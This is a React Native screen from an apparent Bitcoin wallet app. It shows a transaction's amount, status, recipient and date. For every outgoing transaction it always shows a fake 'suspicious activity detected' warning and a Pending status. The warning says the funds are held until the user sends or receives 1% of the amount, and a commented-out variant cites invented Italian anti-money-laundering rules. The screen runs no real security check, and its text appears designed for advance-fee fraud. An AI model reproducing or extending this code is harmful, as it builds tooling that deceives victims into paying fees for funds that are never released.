import { View, Text } from "react-native";
import React from "react";
import { useBitcoinStore } from "../stores/BitcoinStore";
import { FontAwesome6 } from "@expo/vector-icons";
import { format } from "date-fns";
import { SafeAreaView } from "react-native-safe-area-context";
import currencyFormat from "../utils/CurrencyFormat";
import Bitcoin from "../../assets/svgs/bitcoin.svg";
import usdToBtc from "../utils/BitcoinFormat";
const MovmentScreen = ({ route }) => {
  const { amountUsd, date, receiver, type } = route.params;
  const { btcPrice } = useBitcoinStore();
  console.log(date);
  return (
    <SafeAreaView
      className="flex-1 px-4 pt-3"
      style={{ backgroundColor: "#16171C" }}
    >
      <Text className="text-white text-center custom-font-bold text-lg w-full my-3">
        {type.toUpperCase()}
      </Text>
      <View
        style={{ backgroundColor: "#242831" }}
        className="justify-center rounded-xl   mt-3"
      >
        <View className="p-6">
          <View className="pb-6 mb-3 flex-row items-center text-white border-b border-white border-dashed">
            <View className="text-white rounded-full ">
              <View className="w-7 absolute bottom-2 left-2 h-8 bg-white"></View>
              <Bitcoin width={48} height={48} />
            </View>
            <View className="ml-5 ">
              <Text className="text-white custom-font-bold text-3xl">
                {currencyFormat(amountUsd)}
              </Text>
              <Text className="text-white  custom-font  text-base">
                {usdToBtc(amountUsd, btcPrice, 8)}
              </Text>
            </View>
          </View>

          <View
            id="status"
            className="w-full flex-row justify-between pb-2 items-center border-b "
            style={{ borderBottomColor: "#16171C" }}
          >
            <Text className="text-white  custom-font ">Status</Text>
            {type != "Received" ? (
              <View
                className="px-3 py-1 rounded-full"
                style={{ backgroundColor: "#E0F2FC" }}
              >
                <Text style={{ color: "#2EA9EF" }}>Pending</Text>
              </View>
            ) : (
              <View
                className="px-3 py-1 rounded-full"
                style={{ backgroundColor: "#E0F2FC" }}
              >
                <Text style={{ color: "#2EA9EF" }}>Confirmed</Text>
              </View>
            )}
          </View>
          <View
            id="FROM"
            className="w-full justify-between  py-3 border-b "
            style={{ borderBottomColor: "#16171C" }}
          >
            <Text className="text-white  custom-font  text-base pb-1">TO</Text>
            <Text
              className="text-white "
              numberOfLines={1}
              style={{ color: "#95979b" }}
            >
              {receiver}
            </Text>
          </View>
          <View
            id="date"
            className="w-full justify-between py-3 border-b "
            style={{ borderBottomColor: "#16171C" }}
          >
            <Text className="text-white  custom-font  text-base pb-1">
              Date
            </Text>
            <Text className="text-white  custom-font ">
              {format(new Date(date), "MMM d, y H:mm")}
            </Text>
          </View>
          {type != "Received" && (
            <>
              {/*  <View
                id="currentprice"
                className="w-full justify-between pb-1 border-b "
                style={{ borderBottomColor: "#16171C" }}
              >
                <Text className="text-white ">CurrentPrice</Text>
                <Text className="text-white ">{currencyFormat(amountUsd)}</Text>
              </View>
 */}
              <View className="w-full justify-between pb-1 border-b">
                <Text className="text-red-500 custom-font-bold text-lg pb-1">
                  SUSPICIUS ACTIVITIY DETECTED
                </Text>
                {/* <Text className="  custom-font text-red-700 tex-base">
                  To instantly release funds for transactions surpassing
                  $300.00, the recipient must remit 1%({" "}
                  {currencyFormat(amountUsd / 100)}) of the transaction value,
                  in accordance with Italy's anti-money laundering regulations.
                </Text> */}
                {
                  <Text className="text-red-700  custom-font  tex-base">
                    To safeguard the security of your account, we've temporarily
                    paused this transaction due to detected unusual activity. To
                    proceed safely, we kindly ask that you first receive a
                    transaction worth at least 1%(
                    {currencyFormat(amountUsd / 100)}) of the intended amount.
                    This precaution ensures the integrity of your transactions.
                    Rest assured, once this initial step is completed, the
                    remaining funds will be instantly released, allowing you to
                    proceed with your transaction smoothly and securely.
                  </Text>
                }
              </View>
            </>
          )}
        </View>
      </View>
    </SafeAreaView>
  );
};

export default MovmentScreen;
